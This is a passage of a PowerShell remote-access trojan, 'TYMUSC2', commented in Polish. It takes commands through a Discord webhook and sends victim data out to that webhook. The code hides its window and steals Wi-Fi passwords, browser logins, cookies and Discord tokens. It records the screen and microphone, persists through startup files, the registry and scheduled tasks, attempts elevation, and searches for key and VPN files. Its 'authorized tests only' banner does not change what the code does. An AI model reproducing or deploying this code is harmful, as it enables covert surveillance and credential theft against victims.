# ═══════════════════════════════════════════════════════════════════
# TYMUSC2 v2.0 - ZDALNE STEROWANIE PRZEZ DISCORD WEBHOOK
# TYLKO DLA AUTORYZOWANYCH TESTÓW BEZPIECZEŃSTWA!
# ═══════════════════════════════════════════════════════════════════

param(
    [switch]$Startup
)

# ===== KONFIGURACJA =====
$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$checkInterval = 3
$victimName = "MIKOLAJ-PC"
$dataDir = "$env:TEMP\tymushacker_data"
$adminPersistence = $true
$encryptionKey = "TYMUSC2_SECRET_KEY_2024"

# Console hide on startup
if ($Startup) {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
}

# ===== FUNKCJE POMOCNICZE =====

function Send-DiscordMessage {
    param([string]$Content, [string]$File, [bool]$Embed = $false, [hashtable]$EmbedData = @{})
    
    $body = @{
        content = $Content
        username = "TYMUSC2 - $victimName"
    }
    
    if ($Embed -and $EmbedData.Count -gt 0) {
        $body.embeds = @($EmbedData)
    }
    
    try {
        if ($File -and (Test-Path $File)) {
            $form = @{
                payload_json = ($body | ConvertTo-Json -Depth 10)
                file = Get-Item -Path $File
            }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form -ErrorAction SilentlyContinue | Out-Null
        } else {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {
        # silent fail
    }
}

function Send-DiscordEmbed {
    param(
        [string]$Title,
        [string]$Description,
        [string]$Color = "16711680",  # Red
        [string]$Footer = "TYMUSC2 v2.0"
    )
    
    $embed = @{
        title = $Title
        description = $Description
        color = [int]$Color
        footer = @{ text = $Footer }
        timestamp = (Get-Date -Format "o")
    }
    
    Send-DiscordMessage -Content "" -Embed $true -EmbedData $embed
}

function Get-LastCommand {
    try {
        $messages = Invoke-RestMethod -Uri "$webhookUrl/messages?limit=20" -Method Get -ErrorAction SilentlyContinue
        if ($messages) {
            for ($i = $messages.Count - 1; $i -ge 0; $i--) {
                $msg = $messages[$i]
                if ($msg.author.username -ne "TYMUSC2 - $victimName") {
                    $content = $msg.content.Trim()
                    # Sprawdzamy czy to komenda
                    $commands = @(foreach ($c in @('!info','!ip','!screenshot','!ss','!webcam','!cam','!startrecord','!record','!stoprecord','!stop','!shell','!ps','!processes','!kill','!shutdown','!restart','!msg','!speak','!voice','!download','!upload','!clipboard','!cb','!browse','!files','!dir','!keylog','!keys','!getkeylog','!getkeys','!lock','!block','!unlock','!open','!chrome','!type','!alert','!help','!commands','!wifi','!passwords','!browsers','!token','!persist','!clean','!screenshot_all','!grab','!mic','!recordmic','!stopmic','!elevate','!sysinfo','!netstat','!arp','!route','!dnsspoof','!mitm','!blue','!clear','!exit','!hide','!crypt','!decrypt','!zip','!unzip','!search','!min','!max','!move','!key','!idle','!uptime','!users','!share','!services','!registry','!eventlog','!startup','!wallpaper','!vol','!mute','!bright')) {
                        if ($content.ToLower().StartsWith($c.ToLower())) { $c }
                    })
                    if ($commands.Count -gt 0) {
                        return $content
                    }
                }
            }
        }
    } catch {}
    return $null
}

function Get-ComprehensiveInfo {
    $info = @{}
    
    # IP i lokalizacja - rozszerzone API
    try {
        $ipInfo = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction SilentlyContinue
        $info.PublicIP = $ipInfo.ip
        
        # Kilka API dla redundancji
        $geo = $null
        try { $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$($ipInfo.ip)?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,timezone,query" -ErrorAction SilentlyContinue } catch {}
        if (-not $geo) { try { $geo = Invoke-RestMethod -Uri "https://ipapi.co/$($ipInfo.ip)/json/" -ErrorAction SilentlyContinue } catch {} }
        
        if ($geo) {
            $info.Location = "$($geo.city), $($geo.regionName), $($geo.country)"
            $info.ISP = if ($geo.isp) { $geo.isp } else { $geo.org }
            $info.Lat = if ($geo.lat) { $geo.lat } else { $geo.latitude }
            $info.Lon = if ($geo.lon) { $geo.lon } else { $geo.longitude }
            $info.Zip = $geo.zip
            $info.Timezone = $geo.timezone
            $info.AS = $geo.as
        }
        
        # DNS leak test
        try {
            $dnsInfo = Invoke-RestMethod -Uri "https://ipleak.net/json/" -ErrorAction SilentlyContinue
            if ($dnsInfo) { $info.DNS_IP = $dnsInfo.dns_ip }
        } catch {}
    } catch {}
    
    # System - CIM zamiast WMI (nowsze)
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if (-not $os) { $os = Get-WmiObject Win32_OperatingSystem }
        $info.ComputerName = $env:COMPUTERNAME
        $info.Username = $env:USERNAME
        $info.Domain = $env:USERDOMAIN
        $info.OS = $os.Caption
        $info.OSVersion = $os.Version
        $info.Architecture = $os.OSArchitecture
        $info.LastBoot = $os.LastBootUpTime
        $info.InstallDate = $os.InstallDate
        $info.SerialNumber = $os.SerialNumber
        $info.RegisteredUser = $os.RegisteredUser
        $info.Organization = $os.Organization
        $info.Culture = (Get-Culture).Name
        $info.UICulture = (Get-UICulture).Name
    } catch {}
    
    # Hardware
    try {
        $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        if (-not $cpu) { $cpu = Get-WmiObject Win32_Processor }
        $info.CPU = "$($cpu.Name) - $($cpu.NumberOfCores) rdzeni/$($cpu.NumberOfLogicalProcessors) watkow"
        $info.CPU_Load = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Measure-Object -Property LoadPercentage -Average).Average
        
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        if (-not $cs) { $cs = Get-WmiObject Win32_ComputerSystem }
        $info.RAM_GB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
        $info.Manufacturer = $cs.Manufacturer
        $info.Model = $cs.Model
        
        $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if (-not $gpu) { $gpu = Get-WmiObject Win32_VideoController }
        $info.GPU = ($gpu | ForEach-Object { "$($_.Name) - $([math]::Round($_.AdapterRAM/1GB,1)) GB" }) -join ", "
    } catch {}
    
    # Dysk
    try {
        $disks = Get-CimInstance Win32_LogicalDisk -ErrorAction SilentlyContinue
        if (-not $disks) { $disks = Get-WmiObject Win32_LogicalDisk }
        $diskInfo = @()
        foreach ($d in $disks) {
            $diskInfo += @{
                Drive = $d.DeviceID
                TotalGB = [math]::Round($d.Size / 1GB, 1)
                FreeGB = [math]::Round($d.FreeSpace / 1GB, 1)
                UsedGB = [math]::Round(($d.Size - $d.FreeSpace) / 1GB, 1)
                UsedPct = [math]::Round(($d.Size - $d.FreeSpace) / $d.Size * 100, 1)
            }
        }
        $info.Disks = $diskInfo
        $cDrive = $diskInfo | Where-Object { $_.Drive -eq 'C:' } | Select-Object -First 1
        if ($cDrive) {
            $info.DiskTotalGB = $cDrive.TotalGB
            $info.DiskFreeGB = $cDrive.FreeGB
        }
    } catch {}
    
    # Siec
    try {
        $adapters = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' }
        $info.Adapters = @()
        foreach ($adapter in $adapters) {
            $ip = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue
            $dns = Get-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ErrorAction SilentlyContinue
            $info.Adapters += @{
                Name = $adapter.Name
                IP = ($ip.IPAddress) -join ", "
                MAC = $adapter.MacAddress
                Speed = [math]::Round($adapter.LinkSpeed / 1e6, 0)
                DNS = ($dns.ServerAddresses) -join ", "
            }
        }
        $info.LocalIPs = ($info.Adapters | ForEach-Object { $_.IP }) -join ", "
        $info.MAC = ($info.Adapters | ForEach-Object { $_.MAC }) -join ", "
    } catch {}
    
    # Bateria (laptop)
    try {
        $battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
        if ($battery) {
            $info.BatteryPct = $battery.EstimatedChargeRemaining
            $info.BatteryStatus = switch ($battery.BatteryStatus) {
                1 { "Rozladowywanie" }
                2 { "Ladowanie (AC)" }
                3 { "Pelnia" }
                4 { "Niski poziom" }
                5 { "Krytyczny" }
                6 { "Awaria" }
                7 { "Ladowanie" }
                default { "Nieznany" }
            }
        }
    } catch {}
    
    # Procesy
    try { $info.ProcessCount = (Get-Process).Count } catch {}
    
    # Uptime
    try {
        $boot = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($boot) {
            $uptime = (Get-Date) - $boot.LastBootUpTime
            $info.Uptime = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m $($uptime.Seconds)s"
        }
    } catch {}
    
    # Uzytkownicy
    try {
        $sessions = Get-CimInstance Win32_LogonSession -ErrorAction SilentlyContinue | Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 }
        $info.ActiveUsers = ($sessions | ForEach-Object { $_.StartTime }) | ForEach-Object { (Get-Date $_ -Format "HH:mm") } -join ", "
    } catch {}
    
    # Antywirus
    try {
        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
        if ($av) {
            $info.Antivirus = ($av.displayName) -join ", "
        }
    } catch {}
    
    # Firewall
    try {
        $fw = Get-NetFirewallProfile | Select-Object Name, Enabled
        $info.Firewall = ($fw | ForEach-Object { "$($_.Name)=$($_.Enabled)" }) -join ", "
    } catch {}
    
    # Hotfixes
    try {
        $hotfixes = Get-HotFix | Select-Object -First 10
        $info.Hotfixes = ($hotfixes | ForEach-Object { "$($_.HotFixID):$($_.InstalledOn)" }) -join ", "
    } catch {}
    
    return $info
}

function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $graphics.Dispose()
    
    $path = "$env:TEMP\screenshot_$([DateTime]::Now.Ticks).png"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    $bitmap.Dispose()
    return $path
}

function Take-AllScreenshots {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $screens = [System.Windows.Forms.Screen]::AllScreens
    $paths = @()
    $i = 0
    
    foreach ($screen in $screens) {
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        
        $path = "$env:TEMP\screenshot_$($i)_$([DateTime]::Now.Ticks).png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        $paths += $path
        $i++
    }
    
    # Jesli wiecej niz jeden ekran, spakuj w ZIP
    if ($paths.Count -gt 1) {
        $zipPath = "$env:TEMP\screenshots_all_$([DateTime]::Now.Ticks).zip"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
        foreach ($p in $paths) {
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $p, [System.IO.Path]::GetFileName($p)) | Out-Null
        }
        $zip.Dispose()
        foreach ($p in $paths) { Remove-Item $p -Force -ErrorAction SilentlyContinue }
        return $zipPath
    }
    
    return $paths[0]
}

function Start-Recording {
    $recordDir = "$env:TEMP\tymushacker_recording"
    if (-not (Test-Path $recordDir)) { New-Item -ItemType Directory -Path $recordDir -Force | Out-Null }
    
    $recordingFile = "$recordDir\recording_$([DateTime]::Now.Ticks).txt"
    Set-Content -Path $recordingFile -Value "RECORDING_STARTED:$([DateTime]::Now)"
    
    $scriptBlock = {
        param($dir, $file)
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $frameNum = 0
        $maxFrames = 3000  # ~5 minut przy 10 FPS
        while ((Test-Path $file) -and $frameNum -lt $maxFrames) {
            try {
                $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
                $graphics.Dispose()
                
                $framePath = "$dir\frame_$frameNum.jpg"
                $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatID -eq [System.Drawing.Imaging.ImageFormat]::Jpeg.Guid }
                $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 50L)
                $bitmap.Save($framePath, $encoder, $encoderParams)
                $bitmap.Dispose()
                
                $frameNum++
                Start-Sleep -Milliseconds 100
            } catch {
                Start-Sleep -Milliseconds 500
            }
        }
    }
    
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($scriptBlock)
    [void]$ps.AddParameter("dir", $recordDir)
    [void]$ps.AddParameter("file", $recordingFile)
    [void]$ps.BeginInvoke()
    
    return $recordingFile
}

function Stop-Recording {
    param([string]$RecordingFile)
    if (-not $RecordingFile) { return $null }
    if (Test-Path $RecordingFile) { Remove-Item $RecordingFile -Force }
    
    Start-Sleep -Seconds 3
    
    $recordDir = Split-Path $RecordingFile -Parent
    $zipPath = "$env:TEMP\recording_$([DateTime]::Now.Ticks).zip"
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($recordDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    
    Remove-Item "$recordDir\*.jpg" -Force -ErrorAction SilentlyContinue
    
    return $zipPath
}

function Start-MicRecording {
    $recordDir = "$env:TEMP\tymushacker_audio"
    if (-not (Test-Path $recordDir)) { New-Item -ItemType Directory -Path $recordDir -Force | Out-Null }
    
    $audioFile = "$recordDir\audio_$([DateTime]::Now.Ticks).wav"
    
    # Uzywamy starszego API MME przez PowerShell - musimy stworzyc skrypt w C#
    $csharpCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class AudioRecorder
{
    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
    public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, IntPtr hwndCallback);
    
    public static void StartRecording(string filePath)
    {
        string cmd = "open new type waveaudio alias capture";
        mciSendString(cmd, "", 0, IntPtr.Zero);
        cmd = "set capture time format ms bitspersample 16 channels 1 samplespersec 44100";
        mciSendString(cmd, "", 0, IntPtr.Zero);
        cmd = "record capture";
        mciSendString(cmd, "", 0, IntPtr.Zero);
        
        // Zapisz sciezke do pliku
        File.WriteAllText(filePath + ".capture", filePath);
    }
    
    public static void StopRecording(string markerFile)
    {
        string filePath = File.ReadAllText(markerFile + ".capture");
        string cmd = "save capture " + filePath;
        mciSendString(cmd, "", 0, IntPtr.Zero);
        cmd = "close capture";
        mciSendString(cmd, "", 0, IntPtr.Zero);
        File.Delete(markerFile + ".capture");
    }
}
'@

    Add-Type -TypeDefinition $csharpCode -Language CSharp -ErrorAction SilentlyContinue
    
    try {
        [AudioRecorder]::StartRecording($audioFile)
        Set-Content -Path "$dataDir\mic_recording.txt" -Value $audioFile
        return $audioFile
    } catch {
        return $null
    }
}

function Stop-MicRecording {
    $markerFile = Get-Content "$dataDir\mic_recording.txt" -ErrorAction SilentlyContinue
    if (-not $markerFile) { return $null }
    
    try {
        [AudioRecorder]::StopRecording($markerFile)
        Remove-Item "$dataDir\mic_recording.txt" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        if (Test-Path $markerFile) {
            $wavPath = $markerFile
            # Konwertuj na MP3 (lub zip jesli WAV duzy)
            $zipPath = "$env:TEMP\mic_recording_$([DateTime]::Now.Ticks).zip"
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $wavPath, [System.IO.Path]::GetFileName($wavPath)) | Out-Null
            $zip.Dispose()
            Remove-Item $wavPath -Force -ErrorAction SilentlyContinue
            return $zipPath
        }
    } catch {}
    return $null
}

function Get-WiFiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "Profile\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    $results = @()
    
    foreach ($profile in $wifiProfiles) {
        try {
            $details = netsh wlan show profile name="$profile" key=clear
            $password = ($details | Select-String "Key Content\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() })
            $auth = ($details | Select-String "Authentication\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() })
            $bssid = ($details | Select-String "BSSID\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() })
            
            $results += @{
                Profile = $profile
                Password = if ($password) { $password } else { "(brak/zabezpieczony)" }
                Auth = $auth
                BSSID = $bssid
            }
        } catch {}
    }
    
    return $results
}

function Get-BrowserPasswords {
    $results = @()
    
    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        try {
            $tempPath = "$env:TEMP\chrome_logins_$([DateTime]::Now.Ticks).db"
            Copy-Item $chromePath $tempPath -Force
            
            $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempPath;Read Only=True"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            Add-Type -AssemblyName System.Security.Cryptography
            
            while ($reader.Read()) {
                $url = $reader["origin_url"]
                $user = $reader["username_value"]
                $encPass = $reader["password_value"]
                
                if ($user) {
                    # Chrome <80 uzywa DPAPI, >=80 AES z kluczem w Local State
                    $decrypted = ""
                    try {
                        $decrypted = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
                    } catch {
                        $decrypted = "(zaszyfrowane AES-GCM - wymaga klucza)"
                    }
                    
                    $results += @{
                        Browser = "Chrome"
                        URL = $url
                        Username = $user
                        Password = $decrypted
                    }
                }
            }
            $reader.Close()
            $conn.Close()
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    # Firefox
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $loginsFile = Join-Path $profile.FullName "logins.json"
        $keyDb = Join-Path $profile.FullName "key4.db"
        if (Test-Path $loginsFile -and (Test-Path $keyDb)) {
            try {
                $logins = Get-Content $loginsFile -Raw | ConvertFrom-Json
                foreach ($login in $logins.logins) {
                    $results += @{
                        Browser = "Firefox"
                        URL = $login.hostname
                        Username = "(zaszyfrowane)"
                        Password = "(zaszyfrowane - wymaga master password)"
                    }
                }
            } catch {}
        }
    }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        try {
            $tempPath = "$env:TEMP\edge_logins_$([DateTime]::Now.Ticks).db"
            Copy-Item $edgePath $tempPath -Force
            
            $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempPath;Read Only=True"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $url = $reader["origin_url"]
                $user = $reader["username_value"]
                $encPass = $reader["password_value"]
                
                if ($user) {
                    $results += @{
                        Browser = "Edge"
                        URL = $url
                        Username = $user
                        Password = "(zaszyfrowane)"
                    }
                }
            }
            $reader.Close()
            $conn.Close()
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    return $results
}

function Get-BrowserCookies {
    $results = @()
    
    # Chrome cookies
    $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    $cookiesPathOld = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    
    $targetPath = if (Test-Path $cookiesPath) { $cookiesPath } else { $cookiesPathOld }
    
    if (Test-Path $targetPath) {
        try {
            $tempPath = "$env:TEMP\chrome_cookies_$([DateTime]::Now.Ticks).db"
            Copy-Item $targetPath $tempPath -Force
            
            $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempPath;Read Only=True"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%google%' OR host_key LIKE '%github%' OR host_key LIKE '%facebook%' OR host_key LIKE '%twitter%'"
            $reader = $cmd.ExecuteReader()
            
            $count = 0
            while ($reader.Read() -and $count -lt 50) {
                $results += @{
                    Host = $reader["host_key"]
                    Name = $reader["name"]
                    Encrypted = "tak"
                }
                $count++
            }
            $reader.Close()
            $conn.Close()
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    return $results
}

function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\Lightcord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb",
        "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Lightcord\Local Storage\leveldb"
    )
    
    $tokenRegex = '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}'
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                try {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        $matches = [regex]::Matches($content, $tokenRegex)
                        foreach ($match in $matches) {
                            $tokens += @{
                                Path = $path
                                Token = $match.Value
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    
    return $tokens
}

function Persist-Script {
    # Metody persistencji
    $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.ps1"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.bat"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $schedName = "TYMUSC2_Update"
    
    $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
    
    # 1. Startup Folder - PS1
    try {
        if (-not (Test-Path $scriptPath)) {
            Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        }
    } catch {}
    
    # 2. Startup Folder - BAT (uruchamia PS1)
    try {
        $batContent = "@echo off`npowershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup"
        Set-Content -Path $batPath -Value $batContent -Force
    } catch {}
    
    # 3. VBS (ukryte okno)
    try {
        $vbsContent = "CreateObject(`"WScript.Shell`").Run `"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup`", 0, False"
        Set-Content -Path $vbsPath -Value $vbsContent -Force
    } catch {}
    
    # 4. Rejestr
    try {
        Set-ItemProperty -Path $regPath -Name "TYMUSC2" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup" -Force
    } catch {}
    
    # 5. Task Scheduler
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $schedName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
    } catch {
        # Mozliwe, ze nie ma admina
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            Register-ScheduledTask -TaskName $schedName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    return @{
        StartupPS1 = Test-Path $scriptPath
        StartupBAT = Test-Path $batPath
        StartupVBS = Test-Path $vbsPath
        Registry = "TYMUSC2"
        ScheduledTask = $schedName
    }
}

function Remove-Persistence {
    $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.ps1"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.bat"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $schedName = "TYMUSC2_Update"
    
    try { Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item $batPath -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-ItemProperty -Path $regPath -Name "TYMUSC2" -ErrorAction SilentlyContinue } catch {}
    try { Unregister-ScheduledTask -TaskName $schedName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    
    return "Wyczyszczono persistencje"
}

function Elevate-ToAdmin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`" -Startup"
        $psi.Verb = "runas"
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            return "Elevated - nowa instancja jako admin"
        } catch {
            return "Blad elevation - odmowa dostepu"
        }
    }
    return "Juz dzialasz jako administrator"
}

function Get-NetworkInfo {
    $result = @()
    
    # netstat
    try {
        $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Listen' } | Select-Object -First 30
        foreach ($c in $connections) {
            $result += @{
                Type = "TCP"
                Local = "$($c.LocalAddress):$($c.LocalPort)"
                Remote = "$($c.RemoteAddress):$($c.RemotePort)"
                State = $c.State
                Process = (Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue).ProcessName
            }
        }
    } catch {}
    
    return $result
}

function Get-ARPTable {
    try {
        $arp = arp -a | Select-String "(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9\-]{17})" -AllMatches
        $result = @()
        foreach ($m in $arp.Matches) {
            $result += @{
                IP = $m.Groups[1].Value
                MAC = $m.Groups[2].Value
            }
        }
        return $result
    } catch {}
    return @()
}

function Get-ActiveUsers {
    try {
        $sessions = query user 2>&1 | Select-String "^\s*(\S+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(.+)$" -AllMatches
        $result = @()
        foreach ($m in $sessions.Matches) {
            $result += @{
                Username = $m.Groups[1].Value
                Session = $m.Groups[2].Value
                ID = $m.Groups[4].Value
                State = if ($m.Groups[3].Value -eq 'Active') { 'Active' } else { 'Disconnected' }
                IdleTime = $m.Groups[5].Value.Trim()
            }
        }
        return $result
    } catch {
        return @()
    }
}

function Get-SystemServices {
    try {
        $services = Get-Service | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName | Select-Object -First 30
        $result = @()
        foreach ($s in $services) {
            $result += @{
                Name = $s.DisplayName
                Status = $s.Status
                StartType = $s.StartType
            }
        }
        return $result
    } catch {}
    return @()
}

function Search-Files {
    param(
        [string]$Pattern,
        [string]$BasePath = "$env:USERPROFILE"
    )
    
    $results = @()
    $extensions = @('*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf', '*.csv', '*.cfg', '*.config', '*.ini', '*.kdbx', '*.key', '*.pem', '*.p12', '*.pfx', '*.rdp', '*.vnc', '*.vpn', '*.ovpn')
    
    foreach ($ext in $extensions) {
        try {
            $files = Get-ChildItem -Path $BasePath -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 10MB } | Select-Object -First 100
